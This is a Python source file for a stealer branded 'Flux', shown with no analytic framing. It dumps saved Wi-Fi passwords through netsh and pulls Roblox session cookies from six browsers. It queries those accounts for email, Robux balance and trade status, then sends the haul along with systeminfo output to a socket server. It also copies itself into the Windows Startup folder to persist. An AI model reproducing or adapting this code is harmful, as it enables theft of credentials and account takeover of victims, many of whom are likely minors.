import os
import socket
import subprocess
import time
import browser_cookie3
import robloxpy
def connect_to_server():
    try:
        lol = socket.socket()
        lol.connect(("localhost", 2404))
        return lol
    except ConnectionRefusedError:
        return None

putinstartup = True

edge = ''
chrome = ''
opera = ''
operagx = ''
brave = ''
firefox = ''
wifipasswords = ''
import subprocess

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        wifipasswords += "\n{:<30}|  {:<}".format(i, results[0])
    except IndexError:
        wifipasswords +=  "\n{:<30}|  {:<}".format(i, "")
try:
    cookies = browser_cookie3.edge(domain_name='roblox.com')
    cookies = str(cookies)
    cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()

    robloxpy.User.Internal.SetCookie(cookie, True)
    username = robloxpy.User.Internal.Username
    robux = robloxpy.User.Internal.Robux
    cantrade = robloxpy.User.Internal.CanTrade
    premuim = robloxpy.User.Internal.isPremium
    emailverifed = robloxpy.User.Internal.isEmailVerified
    isadmin = robloxpy.User.Internal.isAdmin
    userid = robloxpy.User.Internal.UserID
    phone = robloxpy.User.Internal.UserAbove13
    lol = robloxpy.User.Internal.UserEmail
    edge = "\n---Edge Roblox Cookie Info - Flux ---\nCookie: " + str(cookie) + '\nUsername: ' + str(username) + "\nRobux: " + str(robux) + "\nCan Trade: " + str(cantrade) + "\nIs Premium: " + str(robloxpy.User.Internal.isPremium) + "\nEmail Verified: " + str(robloxpy.User.Internal.isEmailVerified) + "\nIs An Admin: " + str(isadmin) + "\nUserID:" + str(userid) + "\nUser above 13: " + str(phone) + "\nEmail: " + str(lol)+"\n------------------------------"


except:
    pass
try:
    cookies = browser_cookie3.chrome(domain_name='roblox.com')
    cookies = str(cookies)
    cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()

    robloxpy.User.Internal.SetCookie(cookie, True)
    username = robloxpy.User.Internal.Username
    robux = robloxpy.User.Internal.Robux
    cantrade = robloxpy.User.Internal.CanTrade
    premuim = robloxpy.User.Internal.isPremium
    emailverifed = robloxpy.User.Internal.isEmailVerified
    isadmin = robloxpy.User.Internal.isAdmin
    userid = robloxpy.User.Internal.UserID
    phone = robloxpy.User.Internal.UserAbove13
    lol = robloxpy.User.Internal.UserEmail
    chrome = "\n---Chrome Roblox Cookie Info - Flux ---\nCookie: " + str(cookie) + '\nUsername: ' + str(username) + "\nRobux: " + str(robux) + "\nCan Trade: " + str(cantrade) + "\nIs Premium: " + str(robloxpy.User.Internal.isPremium) + "\nEmail Verified: " + str(robloxpy.User.Internal.isEmailVerified) + "\nIs An Admin: " + str(isadmin) + "\nUserID:" + str(userid) + "\nUser above 13: " + str(phone) + "\nEmail: " + str(lol)+"\n------------------------------"


except:
    pass
try:
    cookies = browser_cookie3.opera(domain_name='roblox.com')
    cookies = str(cookies)
    cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()

    robloxpy.User.Internal.SetCookie(cookie, True)
    username = robloxpy.User.Internal.Username
    robux = robloxpy.User.Internal.Robux
    cantrade = robloxpy.User.Internal.CanTrade
    premuim = robloxpy.User.Internal.isPremium
    emailverifed = robloxpy.User.Internal.isEmailVerified
    isadmin = robloxpy.User.Internal.isAdmin
    userid = robloxpy.User.Internal.UserID
    phone = robloxpy.User.Internal.UserAbove13
    lol = robloxpy.User.Internal.UserEmail
    opera = "\n---Opera Roblox Cookie Info - Flux ---\nCookie: " + str(cookie) + '\nUsername: ' + str(username) + "\nRobux: " + str(robux) + "\nCan Trade: " + str(cantrade) + "\nIs Premium: " + str(robloxpy.User.Internal.isPremium) + "\nEmail Verified: " + str(robloxpy.User.Internal.isEmailVerified) + "\nIs An Admin: " + str(isadmin) + "\nUserID:" + str(userid) + "\nUser above 13: " + str(phone) + "\nEmail: " + str(lol)+"\n------------------------------"


except:
    pass
try:
    cookies = browser_cookie3.opera_gx(domain_name='roblox.com')
    cookies = str(cookies)
    cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()

    robloxpy.User.Internal.SetCookie(cookie, True)
    username = robloxpy.User.Internal.Username
    robux = robloxpy.User.Internal.Robux
    cantrade = robloxpy.User.Internal.CanTrade
    premuim = robloxpy.User.Internal.isPremium
    emailverifed = robloxpy.User.Internal.isEmailVerified
    isadmin = robloxpy.User.Internal.isAdmin
    userid = robloxpy.User.Internal.UserID
    phone = robloxpy.User.Internal.UserAbove13
    lol = robloxpy.User.Internal.UserEmail
    operagx = "\n---Opera GX Roblox Cookie Info - Flux ---\nCookie: " + str(cookie) + '\nUsername: ' + str(username) + "\nRobux: " + str(robux) + "\nCan Trade: " + str(cantrade) + "\nIs Premium: " + str(robloxpy.User.Internal.isPremium) + "\nEmail Verified: " + str(robloxpy.User.Internal.isEmailVerified) + "\nIs An Admin: " + str(isadmin) + "\nUserID:" + str(userid) + "\nUser above 13: " + str(phone) + "\nEmail: " + str(lol)+"\n------------------------------"


except:
    pass
try:
    cookies = browser_cookie3.firefox(domain_name='roblox.com')
    cookies = str(cookies)
    cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()

    robloxpy.User.Internal.SetCookie(cookie, True)
    username = robloxpy.User.Internal.Username
    robux = robloxpy.User.Internal.Robux
    cantrade = robloxpy.User.Internal.CanTrade
    premuim = robloxpy.User.Internal.isPremium
    emailverifed = robloxpy.User.Internal.isEmailVerified
    isadmin = robloxpy.User.Internal.isAdmin
    userid = robloxpy.User.Internal.UserID
    phone = robloxpy.User.Internal.UserAbove13
    lol = robloxpy.User.Internal.UserEmail
    firefox = "\n---Firefox Roblox Cookie Info - Flux ---\nCookie: " + str(cookie) + '\nUsername: ' + str(username) + "\nRobux: " + str(robux) + "\nCan Trade: " + str(cantrade) + "\nIs Premium: " + str(robloxpy.User.Internal.isPremium) + "\nEmail Verified: " + str(robloxpy.User.Internal.isEmailVerified) + "\nIs An Admin: " + str(isadmin) + "\nUserID:" + str(userid) + "\nUser above 13: " + str(phone) + "\nEmail: " + str(lol)+"\n------------------------------"


except:
    pass
try:
    cookies = browser_cookie3.brave(domain_name='roblox.com')
    cookies = str(cookies)
    cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()

    robloxpy.User.Internal.SetCookie(cookie, True)
    username = robloxpy.User.Internal.Username
    robux = robloxpy.User.Internal.Robux
    cantrade = robloxpy.User.Internal.CanTrade
    premuim = robloxpy.User.Internal.isPremium
    emailverifed = robloxpy.User.Internal.isEmailVerified
    isadmin = robloxpy.User.Internal.isAdmin
    userid = robloxpy.User.Internal.UserID
    phone = robloxpy.User.Internal.UserAbove13
    lol = robloxpy.User.Internal.UserEmail
    brave = "\n---Brave Roblox Cookie Info - Flux ---\nCookie: " + str(cookie) + '\nUsername: ' + str(username) + "\nRobux: " + str(robux) + "\nCan Trade: " + str(cantrade) + "\nIs Premium: " + str(robloxpy.User.Internal.isPremium) + "\nEmail Verified: " + str(robloxpy.User.Internal.isEmailVerified) + "\nIs An Admin: " + str(isadmin) + "\nUserID:" + str(userid) + "\nUser above 13: " + str(phone) + "\nEmail: " + str(lol)+"\n------------------------------"


except:
    pass

while True:
    lol = connect_to_server()
    if lol is not None:
        break
    else:
        time.sleep(0)

lol.send(os.getlogin().encode())
wow = subprocess.check_output("systeminfo", shell=True).strip().decode()+edge+brave+chrome+opera+operagx+firefox+"\n--- Flux Wifi Passwords Grabber ---\n"+wifipasswords
lol.send(wow.encode())

if putinstartup == True:
    import sys
    import shutil

    import sys
    import shutil

    # Get the path to the current script
    if getattr(sys, 'frozen', False):
        # If the script is run as a bundled executable using PyInstaller
        script_path = os.path.abspath(sys.executable)
    else:
        # If the script is run as a .py file
        script_path = os.path.abspath(sys.argv[0])

    # Create the path to the Windows startup folder
    startup_path = os.path.join(os.getenv("AppData"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    # Check if the script is already in startup
    startup_file = os.path.join(startup_path, os.path.basename(script_path))
    if os.path.exists(startup_file):
        pass
    else:
        # Copy the script to the startup folder
        shutil.copy2(script_path, startup_path)
        pass

